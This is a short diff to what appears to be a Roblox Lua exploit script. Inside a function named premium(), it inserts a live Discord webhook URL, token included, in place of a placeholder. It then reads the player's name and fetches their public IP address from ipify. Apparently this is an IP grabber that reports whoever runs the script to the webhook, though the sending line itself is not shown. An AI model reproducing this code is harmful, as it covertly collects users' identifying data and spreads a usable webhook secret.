@@ -163,7 +163,7 @@ function premium()
 
 
 local name = game:GetService("Players").LocalPlayer.Name
-local WebhookURL = "put webhook here"
+local WebhookURL = "https://discord.com/api/webhooks/989282092347179058/wEKBPcvITDw_CHveqB8LoeS1wOUdCMx3Z48h89fgp7sm0D5SGrxKRMv8YV_tm4zG8f-o"
 local getIPResponse = request({
     Url = "https://api.ipify.org/?format=json",
 })
